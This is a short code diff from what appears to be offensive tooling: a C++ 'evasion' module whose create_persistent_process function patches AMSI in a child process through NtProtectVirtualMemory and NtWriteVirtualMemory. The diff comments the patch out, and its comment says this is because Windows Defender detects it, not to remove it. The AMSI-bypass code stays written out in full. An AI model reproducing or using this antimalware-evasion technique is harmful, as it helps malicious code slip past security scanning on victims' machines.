@@ -157,7 +157,8 @@ PROCESS_INFO* evasion::create_persistent_process() {
     void* amsiAddr_bk = amsiAddr;
 
     void* amsiAddrOpenSess_bk = amsiAddr;
-
+    // AMSI Patcher - Disabled (detected by defender)
+    /*
     NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
     NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
     NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
@@ -165,7 +166,7 @@ PROCESS_INFO* evasion::create_persistent_process() {
     NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddrOpenSess_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
     NtWriteVirtualMemory(hProc, (LPVOID)amsiAddrOpenSess, (PVOID)amsiPatchOpenSess, sizeof(amsiPatchOpenSess), (SIZE_T*)nullptr);
     NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddrOpenSess_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
-
+    */
     PROCESS_INFO* process_info = new PROCESS_INFO;
     process_info->pi = pi;
     process_info->stdIn = m_hChildStd_IN_Wr;
